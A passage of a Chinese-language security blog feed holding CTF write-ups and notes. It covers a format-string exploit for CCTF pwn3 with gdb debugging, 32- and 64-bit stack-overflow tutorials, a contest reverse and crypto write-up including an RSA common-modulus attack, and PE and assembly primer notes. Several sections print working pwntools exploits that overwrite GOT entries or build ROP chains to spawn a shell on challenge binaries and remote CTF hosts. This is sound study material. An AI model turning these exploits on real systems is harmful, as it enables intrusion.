    <content type="text"><![CDATA[好久不跟，每次图片都要生成链接，emmm………说到底还是懒。还是该坚持。 前言学pwn之路上的一个必经之路就是debug，前几天看到一个格式化的题目，在安全课上有相关文章（戳我），对就是那个CCTF-PWN3，exp逻辑很简单，跟着bin看一下exp就能明白，但是始终EOF，无法成功getshell，还记得学长跟我们说过的：做pwn题关键就在于跟exp，了解是哪里利用不对。OK，那就学学如何attach。 正文先贴上自己做这题的exp,具体的利用逻辑可以到上面的那个文章里进行查看： #!/usr/bin/env python from pwn import * context.log_level = &apos;debug&apos; elf = ELF(&apos;pwn3&apos;) libc = ELF(&apos;libc.so.6&apos;) pr = process(&apos;./pwn3&apos;) #gdb.attach(pr, &apos;b *0x804889B&apos;) username = &quot;rxraclhm&quot; pr.recvuntil(&quot;Name (ftp.hacker.server:Rainism):&quot;) pr.sendline(username) # 1 -&gt; get # 2 -&gt; put # 3 -&gt; dir # other -&gt; exit def put(pr, name, content): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;put&apos;) pr.recvuntil(&quot;upload:&quot;) pr.sendline(name) pr.recvuntil(&quot;content:&quot;) pr.sendline(content) def get(pr, name, num): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;get&apos;) pr.recvuntil(&apos;get:&apos;) pr.sendline(name) return pr.recvn(num) def dir(pr): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;dir&apos;) plt_puts = elf.symbols[&apos;puts&apos;] print &apos;plt_puts= &apos; + hex(plt_puts) got_puts = elf.got[&apos;puts&apos;] print &apos;got_puts= &apos; + hex(got_puts) # /bin/sh pause() put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts)) text = get(pr, &apos;/sh&apos;, 4) puts_addr = u32(text) print &apos;puts_addr= &apos; + hex(puts_addr) system_addr = puts_addr - (libc.symbols[&apos;puts&apos;] - libc.symbols[&apos;system&apos;]) print &apos;system_addr= &apos; + hex(system_addr) def foo(name, address, num): num = num &amp; 0xff if num == 0 : num == 0x100 payload = &apos;%&apos; + str(num) + &apos;c%10$hhn&apos; payload = payload.ljust(12, &apos;A&apos;) put(pr, name, payload + p32(address)) get(pr, name, 0) foo(&apos;n&apos;, got_puts, system_addr) foo(&apos;i&apos;, got_puts+1, (system_addr&gt;&gt;8)+6) foo(&apos;b&apos;, got_puts+2, system_addr&gt;&gt;16) foo(&apos;/&apos;, got_puts+3, system_addr&gt;&gt;24) #put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts)) text = get(pr, &apos;/sh&apos;, 4) puts_addr = u32(text) print &apos;puts_addr= &apos; + hex(puts_addr) # system(&quot;/bin/sh&quot;) dir(pr) pr.interactive() 我们直接本地执行是无法getshell的 那么到底什么地方出了问题呢，有了利用逻辑，可以根据自己的逻辑一个一个的排查： 泄漏的system地址错误？ 这个题目第一步就是利用格式化字符串泄漏puts的真实地址然后根据libc的偏移计算出system的地址。那么会不会是libc出了错误呢？ attach是时候表示一下了,这里其实可以直接在exp里调用attach，这里为了看的清楚，手动attach。在泄露位置下断点，然后在gdb中attach相关pid启动调试 然后在gdb中需要在一个地方下断点使得程序进入相关位置进行观察，然后c到相关位置（这里需要在左边的DEBUG终端内触发一下才可以继续。）然后在gdb中把puts地址打印出来，和泄漏的进行对比。嗯，这个可能排除。 覆写出了问题？泄漏出来地址之后就是构思如何执行system(/bin/sh)看到dir函数里有一个puts函数，我们进行利用格式化字符把puts的地址进行覆写，在执行puts(/bin/sh),就变成了system(/bin/sh) 这里会不会是覆写出了问题呢？可以看一看。直接在puts的调用地方下断点。 直接c到相关位置: 可以看出来，参数/bin/sh已经成功写入，那么与puts绑定的got有没有成功改写呢？继续跟。s进入puts 下图可以看出我们覆写的是没有问题的。额。。的确puts的got被我们改成了我们计算出来的system的地址了。 libc不匹配那就奇怪了，为什么没有成功getshell呢？下图给你答案，libc不匹配，通过提供的libc的offset计算的system地址是不正确的。 这里我们看到c3和c9相差了6，那么我们将覆写system地址对应位置加上6即可覆写成功，即（foo(‘i’, got_puts+1, (system_addr&gt;&gt;8)+6)）或者是去找到对应的libc直接跑exp即可getshell。 总结我曾请教过一个大佬，如何学习pwn，他给我的意见就是到XCTF社区把那些热门题目跟exp多熟悉即可。的确，用好资源,重在积累。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[校赛Reverse&Crypto writeup]]></title>
    <url>%2F2017%2F12%2F02%2F%E6%A0%A1%E8%B5%9BReverse-Crypto-writeup%2F</url>
    <content type="text"><![CDATA[2017.12.2日举办的校赛圆满结束，整理一下我们小组出的逆向和密码学的writeup Reverse简单的Re这道真的很简单，我们直接IDA内一顿操作，找到关键地方，如下图所示： 正确flag与0x53异或一下得到的结果就是程序内的自带数据，不多做解释。 a=[53,63,50,52,40,1,96,37,54,103,32,58,**,**,**,**,32,12,102,60,12,58,61,39,54,97,54,102,39,33,63,61,52,46] flag=&apos;&apos; for i in range(0,len(a)): flag+=chr(a[i]^0x53) print(flag) 来自计算机七号的挑（song）战（fen）很有深度的一道题目，IDA看一下 大致逻辑可以看得很清楚，我们输入的flag和7异或后加上7存放于一个数组中，问题在于后面是和什么异或然后和内存数据进行比较的呢？ IDA看不到只能用OD跟踪了。 这里可以看到是和什么异或然后和239之类的数据进行比较的。所以说，我们可以修改跳转把所有的异或数据全部拿出来，最后15个数据为：jblg8DD3qFr04i4 OK，flag就是一个脚本的问题了。 Android_B一道安卓题目，app就先下载下来玩玩嘛，安装完打开发现页面上有一个按钮，按不了. 题目描述按到就给flag，也不知道是不是骗人，那就试试呗，程序猿肯定把butto的click功能给false了，那么我们只要找到smail文件的关键位置把false改成true就行了，剩下就是把猜想付诸于行动。 OK改完了，那么我们重新编译然后再安装试试，发现真的给了一串乱码数据，管他呢，试试先，提交乱码的MD5值，Bingo，过了。 破解快乐打开程序看一看 java写的一个程序，用jd-gui打开源码看看。主要的程序就是下面四个，其中第二个注意是一个提示的坑，不要踩进去，整理一下逻辑写个脚本结束。 第一幅图的拷贝函数很迷惑人， 看准跳转是关键！贴下脚本： def diedai(n): if n &gt;2: return diedai(n-1)+diedai(n-2) else: return 1 def change(n,k): return diedai(n)%len(k) if __name__ == &apos;__main__&apos;: str = &quot;vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬&quot; x = [] for i in range(len(str)): x.append(chr((ord(str[i]) &gt;&gt; 1) + 15)) key=&apos;&apos;.join(x) s=[] z1=0 for z2 in range(0,4): for z3 in range(0,4): s.append(key[change(z1+z3,key)]) z1+=5 print(s) Android2这题给了一个加密文件，一个apk，还是安装看看。 发现里面有两个按钮，一个加密，一个解密，但是解密按完程序就蹦了，只有加密能出东西，而且他里面自己设置了一个类似密钥的东西，那就分析一下代码 关键代码是这一点，解密内没有代码，他的重要操作就是异或，异或可以，但是下面有图片验证，那么我们先把后缀改为图片后缀，然后再次加密，试试看嘛。 OK,加密图片解出来了，大吉大利今晚吃鸡。图片上的base16解密即可。 Maze这个程序打不开。 提示和数据打打交道，看看Hex PE头应该在80H处，但是80H处是2333，所以把2333改成PE头就行 OK程序可以打开其实这个考察也不一定要解开，主要writeup在此： 点我点我 一起来“胖”啊简单的格式化字符串漏洞，利用漏洞泄漏任意函数的真实地址，然后在lib中找到偏移地址算出system的真实地址，再次利用system，传入/bin/sh参数完成利用 exp： from pwn import * \#context.log_level = &apos;debug&apos; p = remote(&quot;192.168.1.113&quot;, 8888) \#p=process(&quot;./pwne&quot;) \# get printf libc addr printf_got = 0x0804a010 leak_payload = &quot;bb%6$saa&quot; + p32(printf_got) p.recvuntil(&quot;Hello, World\n&quot;) p.sendline(leak_payload) p.recvuntil(&quot;bb&quot;) info = p.recvuntil(&quot;aa&quot;)[:-2] print info.encode(&apos;hex&apos;) \# get system libc addr print_addr = u32(info[:4]) print &quot;print_addr:&quot;+hex(print_addr) \#p_s_offset = 53479 # addr(printf) - addr(system) printf_offset=0x4D280 system_offset=0x40190 system_addr = print_addr - printf_offset + system_offset print &quot;systen_addr:&quot;+hex(system_addr) \# get payload payload = fmtstr_payload(4, {printf_got: system_addr}) \# send payload p.recvuntil(&quot;Hello, World\n&quot;) p.sendline(payload) p.sendline(&apos;/bin/sh&apos;) p.interactive() Crypto密码学100很简单，凯撒加栅栏的加密，解密一下即可，注意大小写的存在： 先栅栏解密agvb{Tjp_1Mz_X1zQzm} 然后凯撒移位flag{You_1Re_C1eVer} 贝斯家族根据描述可以知道，flag加密了36次base64，又加密一次base16脚本： import base64 f=open(&quot;E:\Users\dd.txt&quot;,&apos;r&apos;) flag = f.read() flag = base64.b16decode(flag) for i in range(36): flag=base64.b64decode(flag) print(flag) ###RSA 分析流量包提取有用信息： 看到有三个key的压缩包，压缩包可以通过foremost或者binwalk提取出来。 key1：—–BEGIN PUBLIC KEY—–MIGAMA0GCSqGSIb3DQEBAQUAA28AMGwCZQCnZIbrdaPobT4Ia+0c3yj+tR7l6prJbyoeOrDRK5mXyasdn8HSExKeruRFMELsOupuF0Dw15zKzv8+9J+SQjE+7eZ/svRDC6aPXQZGXKtcMiIqlHa4Q3hI6cw3WFgbYdIlC1OZAgMBAAE=—–END PUBLIC KEY—– key2：—–BEGIN PUBLIC KEY—–MIGAMA0GCSqGSIb3DQEBAQUAA28AMGwCZQCnZIbrdaPobT4Ia+0c3yj+tR7l6prJbyoeOrDRK5mXyasdn8HSExKeruRFMELsOupuF0Dw15zKzv8+9J+SQjE+7eZ/svRDC6aPXQZGXKtcMiIqlHa4Q3hI6cw3WFgbYdIlC1OZAgMBAAM=—–END PUBLIC KEY—– 还有两个cry的txt需要扣取出来就好。 分解两个公钥得到不同的两个不同的e和一个相同的n，会玩rsa的就可以知道是共膜攻击。 写代码，解题再转码转字符得到flag。脚本：#!/usr/bin/env python3# coding:utf-8import binasciidef modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&apos;modular inverse does not exist&apos;) else: return x % m def egcd(a,b): if a==0: return (b,0,1) else: g,y,x=egcd(b%a,a) return (g,x-(b//a)*y,y) def main(): #c1为密文1 c1=2030811156522080479534380585679540224811392358471221121903500951020792730252365410965194272526859671449231195224643995533159581726005071102332599685927429796174012361879498368574822467464773239467267683166997996469735733139730718951657093072#c2为密文2 c2=432349880784956087467730931619622010551468577048036338892145633949921703163476344960761289142596504797262111871151379630491409846619636163453069518097091623785238077044180062258181941690990234123420861146760076308983603961910238392785031770#n为模 n=0xa76486eb75a3e86d3e086bed1cdf28feb51ee5ea9ac96f2a1e3ab0d12b9997c9ab1d9fc1d213129eaee4453042ec3aea6e1740f0d79ccaceff3ef49f9242313eede67fb2f4430ba68f5d06465cab5c32222a9476b8437848e9cc3758581b61d2250b5399 #egcd()两个参数分别为e1和e2s = egcd(65537, 65539)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m = (pow(c1,s1,n)*pow(c2,s2,n)) % nh = hex(m)[2:-1]print binascii.a2b_hex(h)if name == ‘main‘: main() 4.得到flag：flag{deciphering_is_very_interesting}]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓冲区溢出--栈溢出]]></title>
    <url>%2F2017%2F09%2F30%2F%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[隔了好久不更，今儿就把搞懂的32位下和64位下的栈溢出漏洞分享一下咯，太菜，求大佬放过。 Ⅰ.预热搞懂栈溢出前提得把函数调用的时候栈内的变化和操作顺序，esp和ebp两个寄存器中指针的变化。这两个方面可参照前面这篇文章。 Ⅱ.原理①.简介栈溢出，顾名思义，就是把栈给搞炸，通过覆盖的方式把需要利用的地方进行修改，从而达到攻击的效果。 ②.细说借用一下前面的图和例子，main函数在调用func_A函数的时候会主动压入返回地址，这个返回地址是为了让func_A执行结束之后能找到回家的路（也就是回到母函数内执行。)然后就是funcA局部变量入栈，最后跳转到代码区进行执行指令了。func_B被调用func_A也重复了main函数的工作，这里就不在多说。 那么在func_B执行的时候，我们计算好局部变量（后面简称buf）的大小，假设为0x16这么大，那么就可以用0x16的任意数字或字母进行填充，这样这个盒子就被填满了， 另外别忘了，现在func_B现在在栈里打头阵的，所以esp和ebp分别在栈帧上方和局部变量下方，那么ebp也需要被填充，这里要注意在32bit下是4字节，而在64bit下就是8字节了。 同样是任意字符填充，再往下就是返回地址了，关键地方，然后我们想要调用的函数地址get到之后将原来的返回地址已覆盖就完成漏洞利用了。 ③.传参32bit：参数是直接存放在栈中的。 64bit：如果函数的参数数量小于 6 , 则从左至右依次存放在寄存器 :rdi, rsi, rdx, rcx, r8, r9 如果大于 6 , 那么多出来的参数按照从右至左的顺序依次压栈x64的栈帧在返回地址额下面 给一个看到的链接，关于64bit的传参问题 Ⅲ.乘热打铁。来两道例题练练好了。这里是出处 ①.32bit：主函数，里面有一个函数调用。 跟进来，定义了数组大小0x88(ebp-88h看出)，read读入数据，那就可以进行利用。 查看一下导入表，程序已经给绑定好了system函数，和/bin/sh这个command，那么我们直接把地址拿来用就好了。 贴上简单的exp：（junk和ebp做到覆盖buf数组，然后覆盖返回地址为system的调用地址，最后给函数传入指令参数，完成利用。这里的p32是为了让系统能够接收而对地址进行了打包，下面例子中p64也是同样的效果。p.send是向服务器发送数据，最后一句是与服务器交互。） from pwn import * #buf=0x88 #p = process(&apos;./level&apos;) p = remote(&apos;pwn2.jarvisoj.com&apos;,9878) systemaddr=0x08048320 shelladdr=0x0804A024 junk=&apos;a&apos;*0x88 ebp=&apos;aaaa&apos; payload=junk+ebp+p32(systemaddr)+p32(4)+p32(shelladdr) p.send(payload) p.interactive() ②.64bit：和上面一题是孪生兄弟，只是一个32bit，一个64bit下的。程序一模一样，所以思路也就类似，如图。 直接给出exp：（ELF是加载level2_x64程序。下面一句则可以直接获得system的调用位置，前面提到，64bit下参数是提前存放在寄存器中，然后函数需要参数时候，由寄存器传参。因为我们只需要传入command参数，所以我们只需要知道rdi寄存器所在位置。最后步骤就是，0x80(buf)+8(ebp)+到寄存器地址+传入参数+system函数调用） from pwn import * #buf = 0x80 #p=process(&apos;./level2_x64&apos;) p=remote(&apos;pwn2.jarvisoj.com&apos;,9882) level2=ELF(&apos;./level2_x64&apos;) systemaddr=level2.plt[&apos;system&apos;] print systemaddr shelladdr=0x0000000000600a90 rdireaddr=0x00000000004006b3 payload=&apos;a&apos;*136+p64(rdireaddr)+p64(shelladdr)+p64(systemaddr) p.send(payload) p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XMAN排位赛-babymaze]]></title>
    <url>%2F2017%2F08%2F10%2FXMAN%E6%8E%92%E4%BD%8D%E8%B5%9B-babymaze%2F</url>
    <content type="text"><![CDATA[暑期XMAN排位赛中一道逆向思路 看到题目名字，babymaze，中文意思是婴儿迷宫，看来是一个跟迷宫有关的题目。要不就是迷宫清空，要不就是走出迷宫。 好了，咱先打开题目输入看看，为了看得清楚防止一闪而过，我们就用OD打一个辅助好了。 word天，居然还是日文，吓的我赶紧翻译了一波，好像是不对的意思吧。。暂且不管。用IDA看看关键代码吧。 又发现一撮日文，一个个翻译了下，意思已经标注，（如上图所示）有正确提示和错误提示，但是就是没有发现刚才出现的那个提示，所以想这个还是一个调用，所以我们往前追溯。 Ok,找到了，上图可以看出第一步，也就是flag的格式了，必须是xman{xxxxxxxx}的格式，那么，在123和125的验证中间还有一个函数调用，这儿也就是我们刚才看到的那另一串答案提示了。 看上图这一串数据，应该就是构成迷宫的关键了吧，如果看不出来咱可以用OD，验证一下咯，输入xman{1231231231231234},这样程序就会跑到那儿去进行赋值进行迷宫的制造，然后我们看看数据就可以看出来迷宫了。 我们把迷宫排列一下就是下面这个样子了。 继续往下分析。看到了四个判断嵌套，分别是1，2，3，4的if判断，点进去看的东西如下图注释，1234分别代表左右上下。除此以外我们还可以看出A1指针代表列，A2指针代表行。 要问判断依据？，看下面这个图的红色剪头，由于刚才看到的迷宫是六行九列的，那么与9相乘的数据就是列所在指针，后面的加数就是行所在指针，而且这里红色箭头指向的函数返回的数据是与32进行对比是否一样，一样则是0，那么和1异或，如果不一样，你懂得。~~~ 而32的十六进制就是0x20也就是迷宫的数据，我们把迷宫用01进行填充一下好了。 下面就剩下最后的两个判断，一是是否走到尽头，二是是否只走了16步。 OK，全部搞懂了吧，开始你的迷宫之旅。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小论PE结构]]></title>
    <url>%2F2017%2F07%2F21%2F%E5%B0%8F%E8%AE%BAPE%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[前面在二进制文件中小提了一下PE结构，只是皮毛，这里在做一些添加。 PE文件的概念弱弱的解释一下：PE(Portable Executable)文件称为可移植的可执行的文件，是微软Windows操作系统上的程序文件，包括EXE、DLL、SYS等。 PE文件的结构主要就是下图所示的三大块儿 PE结构之DOS头所有的PE文件都是以一个64字节的DOS头开始。这个DOS头只是为了兼容早期的DOS操作系统。 PE结构之PE文件头PE文件头是PE文件格式各部分中信息以及结构较为复杂的一个部分，主要包含三部分： PE文件标志 映像文件头* 可选文件头 PE文件标志是一个常量，即“PE00”，它标志着PE文件头的开始，同时它也是PE文件的一个主要标识。可以通过DOS头中e_lfanew找出该标志的位置。 映像文件头，它紧跟在PE文件标识的后面，映像文件头是一个结构体。 Machine代表着改程序要执行在的计算机的类型；NumberOfSections表明了该PE文件的节数，该值与表的数量以及节表的数量应保持一致；SizeOfOptionalHeader表明了可选映像头的大小。 可选映像头，尽管名字是可选映像头，但是事实上它并不是可选而是必须存在的，是“必选”的。 PE结构之节表节表是紧挨着NT映像头的一结构数组，它的数量与节的数量是一致的，也与映像头文件中NumberOFSections是一致的。 PE结构之节信息这里在前面也提及到了，PE文件格式把可执行文件分成若干个数据节(section)，不同的资源被存放在不同的节中，PE文件中的节类型包括： .text 由编译器产生，存放着二进制的机器代码，也是反汇编和调试的对象 .data 初始化的数据块，如宏定义、全局变量等 .idata 可执行文件所使用的动态链接库等外来函数与文件的信息 .rsrc 存放程序的资源，如图标、菜单等 .reloc、edata、.rdata等 PE文件的查看注意，分析一波，在此之前贴一个PE图，参照这个进行分析： OK,随机打开一个PE可执行文件。 上图的1标记处看出MZ长度虽然不定，但是E-lfanew的位置却是定的，在3ch处，这个很关键，因为PE文件头部就是有e_lfanew定位的. 那从上面的3ch处发现了PE文件头的位置就在00E8，是不是呢？继续往下看。图的2标记处看出DOS处长度不定。 上图可以看出DOS的所占很长，基于E-lfanew偏移大小为ACH，后面就是PE文件头所在位置，也的确就在00E8处。 最后看图的3标记处，也就是说PE文件后缀所在位置，那标准位置就是基于PE头偏移04h+14h-2h=16h处也就是下图选中的位置。 下面再看看节的信息，就以.text为准吧。看看PE结构表。 如上图所示，偏移量在字节表头地址偏移14h后面。那就在右边找到.text字节位置处。向后找14h处偏移，得到.text节基于PE文件的偏移为0400，如下图所示。 验证一下，转到0400地址处，的确是.text节的存储数据。如下图所示： 最后贴上整理比较详细的一些PE结构讲解： http://blog.csdn.net/evileagle/article/details/11693499 http://www.cnblogs.com/guanlaiy/archive/2012/04/28/2474504.html]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编子程序]]></title>
    <url>%2F2017%2F07%2F20%2F%E6%B1%87%E7%BC%96%E5%AD%90%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[前面总结了汇编的寄存器及相关知识，这里了解一下汇编代码的编写并做一个读代码小练习。 代码解析assume cs:code data segment db &apos;conversation&apos;,0 data ends code segment start: mov ax,cs mov ds,ax mov si,offset capital//cs:si 为capital所在代码开始,在汇编中表示某位置使用段地址+偏移量来进行定位的，下面的读取也是类似。 mov ax,0 mov es,ax mov di,200h //es:di 为200h+0开始 mov cx,offset capitalend-offset capital ;两地址相减作为复制长度 cld ;清除DF标志为0，是数据按地址又低到高的正确顺序传输 rep movsb ;DS:SI这段地址的N个字节复制到ES:DI指向的地址 ;以上一段代码作用为从capital段到capitalend复制code到200h+0的位置,共11h行 mov ax,0 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0//这两行作用为指定int 7ch开始地址为200h(这里的7ch是我们自己定义的中断，中断的赋值概念低地址位为偏移量，高地址位为段值) mov ax,data//这里也就是0000:0200位置 mov ds,ax mov si,0 int 7ch；自定义终端，不一定为7c ;调用复制的capital代码 mov ax,data mov es,ax;数据起地址data mov bp,0;偏移量0 //这里取es:bp位置的值，也就是转化之后的数据 mov al,0;光标跟随输出位置 mov bl,9;蓝色高亮 mov bh,0;页数,0为当前页 mov dh,0;y坐标 mov dl,0;x坐标 mov cx,12;12个大小的长度 mov ah,13h;输出字符 ;上方为设置参数 int 10h//这里是int 10h截断，有相关网址进行介绍 ;输出 mov ax,4c00h int 21h ;退出 capital: push cx；压入cx用以计数 push si；压入si用以计数 change: mov cx,[si] mov ch,0 jcxz ok；判断cx为0退出 and byte ptr [si],11011111b;a=&apos;1100001&apos; A=&apos;1000001&apos;所以‘&amp;’一下就是就是小写字符转化为大写字符了。 inc si jmp short change ok: pop si;执行si出栈 pop cx；执行cx出栈 iret capitalend: nop code ends end start 相关知识点程序详解:http://blog.sina.com.cn/s/blog_171daf8e00102xcur.html 汇编语言的调试方法：http://www.cnblogs.com/hustlijian/archive/2011/06/04/2072656.html Int 10h相关设置的知识点：http://www.cnblogs.com/magic-cube/archive/2011/10/19/2217676.html 汇编中字、双字、字节关系：https://zhidao.baidu.com/question/270682681.html 程序中出现的rep movesb 以及cld详解：https://zhidao.baidu.com/question/270682681.html]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>汇编基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XMAN练习 writeup及所得]]></title>
    <url>%2F2017%2F07%2F19%2FXMAN%E7%BB%83%E4%B9%A0writeup%E5%8F%8A%E6%89%80%E5%BE%97%2F</url>
    <content type="text"><![CDATA[XMAN夏令营虽然没参加，但是选拔赛的题目还是乘着闲暇时间做了几道，并且也学习到了一些。在这里做个总结。 第一道reverse老规矩就IDA看一波 找关键字符，跟踪过去F5大法。下图很明显关键处，而if判断便是重要所在。 这个题目逻辑还是很清晰的，里面自带的乍一看以为是Base64，然而编译出来的不知道什么鬼，在往下看，将我们输入的19位异或操作然后sub_4996DD函数又是一通操作，其实就是做了Base64转换，为什么看出来，应为上面的Base64解码就是19位，根据特性所以猜测如此 那就很明了了，逆运算即可，附上代码： from base64 import * w=&apos;WEw2TX82amFXOFlUXz1RSUVfbw==&apos; t=b64decode(w) print(t) q=&apos;&apos; for j in range(len(t)): q+=chr(ord(t[j])^j) print(q) 第二道安卓直接反编译一波 明显的correct和failed提示，关键就是encode.check了 跟过去，可以看到算法，也很简单输入的字符与b进行加法运算与61取模然后乘2再减去循环次要和输入的一样，那就爆破吧。 附上代码： b = [23, 22, 26, 26, 25, 25, 25, 26, 27, 28, 30, 30, 29, 30, 32, 32] w=&apos;&apos; for i in range(len(b)): for j in range(127): if ((j+b[i])%61)*2-i==j: w+=chr(j) print(w) 第三道 安卓（有所得）给的是一个smali文件，直接用smali2java编译成java语言看好了。 看看代码，大致流程和Base64没差，除了最后的对应转换表，将输入的以8位二进制转换，然后以6的倍数为条件补‘0’，最后6位为单位切片，在对应标志选择相应位置替代。 这样一来就可以逆向算法，一步一步已经写出了代码： end=&apos;xsZDluYYreJDyrpDpucZCo&apos; temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos; aa=[] bb=[] cc=[] str1=&apos;&apos; cnt=0 s=&apos;&apos; flag=&apos;&apos; for i in end: aa.append(temp.find(i)) for i in aa: bb.append(bin(i)[2:]) for i in range(len(bb)): while (len(bb[i]) != 6): bb[i] = &apos;0&apos; + bb[i] for i in bb: str1 += i for i in str1: s += i cnt += 1 if not cnt % 8: cc.append(s) s = &apos;&apos; for i in cc: flag+=chr(int(i,2)) print(&apos;flag= %s&apos; % (flag)) 上面都是一些简单的操作，所得何在，在于python的认知 int(str,’2/8/10/16’):这个可以将字符串转换为整型十进制，在这题的应用就在于将‘100101’转换为对应的十进制整形。 ‘’.split(‘’):可以将string按照相应的代表性质字符转换为列表例如：’10010101 11110000’.split(‘ ‘)==&gt;[‘10010101’,’11110000’] bin()转换之后得到的是一个str类型数据。 以上三点也许大牛看来很low，但毕竟是自己的积累。最后附上最终代码： w=[] mt=&apos;&apos; end=&apos;xsZDluYYreJDyrpDpucZCo&apos; temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos; for i in range(len(end)): w.append(temp.find(end[i])) m=&quot; &quot;.join([format(i,&apos;b&apos;) for i in w]) for j in m.split(&apos; &apos;): if len(j) != 6: mt+= &apos;0&apos; * (6 - len(j)) + j else: mt+=j m_change=mt[:-(len(mt)%8)] flag=&quot; &quot;.join(bin(int(x,2)) for x in [m_change[i:i+8] for i in range(0,len(m_change),8)]) print(&apos;&apos;.join([chr(i) for i in [int(b, 2) for b in flag.split(&apos; &apos;)]]))]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制文件基础]]></title>
    <url>%2F2017%2F07%2F07%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[堆栈大致了解之后，了解一下windows下的二进制文件。 PE文件格式 源代码被编译和链接之后形成了可执行文件。可执行文件之所以被操作系统加载运行，主要是因为他们有一个统一的格式规范。 PE（Portable Executable）是Win32下的可执行文件遵守的数据格式( 补充：Linux下的可执行文件一般是Elf的文件。)。常见的可执行文件（.exe .dll）都是典型的PE文件。 一个可执行文件不光光包含二进制文件的机器代码。还有字符串，菜单，图标，字体等一系列信息，PE文件格式规定了所有的这些信息在可执行文件中如何有规律的进行。所以说，要将一个可执行文件装入内存是一个非常难的事情。 PE文件格式把可执行文件分成若干个数据节，不同的资源呗存放在不同的节中，一个典型的PE文件包含的节如下： .text: 由编译器生成，存放二进制的机器代码，也是我们反汇编和调试的对象。 .data: 初始化的数据块，如宏定义、全局变量、静态变量等。 .idata：可执行文件链接的其他动态库中的有关外来函数以及信息。 .rsrc: 存放程序图标资源等。 如上图所示，那四类是比较常见的节，除此之外还可能出现的有“.reloc”,“.edata”,“.tls”,“.rdata”等。 加壳概念 加壳其实应该叫做可执行程序资源压缩，是保护文件不被随意修改的一种技术。但并不是表示被加壳的程序就不能进行运行，只是无法查询和修改源代码而已，只有脱完壳之后才可以查看源代码。 加壳其实就是利用特殊的算法对程序的代码和资源进行压缩，就好像我们用WINZIP对重要文件进行加密压缩一样，他只是在程序内部进行这样的操作而已。打一个比方，如果说程序是外套，源代码等资源是人的身体的话，那壳就是位于两者之间的一件衬衫。 现在也有许多的加壳工具，这些工具在文件头中会加入一段指令，告诉CPU如何才能解压自己，只是现在CPU处理速度都是秒秒钟的那种，所以加壳与不加壳的程序运行根本看不出什么不一样，除非你想了解源代码，你就会发现你被壳拒之门外。 加壳工具分为两种: 压缩壳:其特点主要是减小软件体积大小，加密保护并不是重点。 加密壳:其种类比较多，不同的壳侧重重点不同，一些壳单纯保护程序，另一些壳也提供注册、使用限制等功能。现如今需要付款使用的软件其实就是加了壳。 虚拟内存 Windows的内存可以被分为两个层面：物理内存和虚拟内存。其中，物理内存非常复杂，需要进入Windows内核才可以看到。通常，在用户模式下，用调试器看到的都是虚拟内存。 用户启用程序使用的地址称之为虚拟地址和逻辑地址，其对应的存储空间称为虚拟内存和或逻辑地址空间。而计算机物理内存的访问地址则称为实地址和物理地址，其对应的存储空间称为物理存储空间或主存空间。程序进行虚拟地址到实地地址转换的过程叫做程序的再定位。 注:这里所说的内存是指Windows用户态内存映射机制下的虚拟内存，操作系统原理也有“虚拟内存”的概念存在，那是在实际物理内存不够时，有时候系统会把“部分硬盘空间”当作内存使用从而使得程序得到装载运行的现象，二者不能混淆。 PE文件与虚拟内存的映射 在调试漏洞时候通常要进行两部操作： 静态反汇编查看PE文件中某条指令的位置是相对于磁盘文件而言的，也就是需要知道文件偏移。 还需要知道这条指令在内存中的位置，也就是虚拟内存地址。 为此，我们需要弄清楚PE文件地址和虚拟内存地址之间的关系，首先了解几个重要的概念。 (1) 文件偏移地址（File Offset） 数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。 (2) 装载地址（Image Base） PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址是0x00400000,DLL文件是0x10000000。这些位置可以通过修改编译选项进行更改。 (3) 虚拟内存地址（Virtual Address） PE文件中的指令被装入内存后的地址。 (4) 相对虚拟地址（Relative Virtual Address RVA） 相对虚拟地址是内存地址相对于映射基址的偏移量。虚拟内存地址、映射基址和相对虚拟内存地址三者之间有如下关系：VA = Image Base + RVA 在默认情况下，一般PE文件的0字节将映射到虚拟内存的0x00400000位置，这个地址就是所谓的装载基地址（Image Base）。如下图所示， 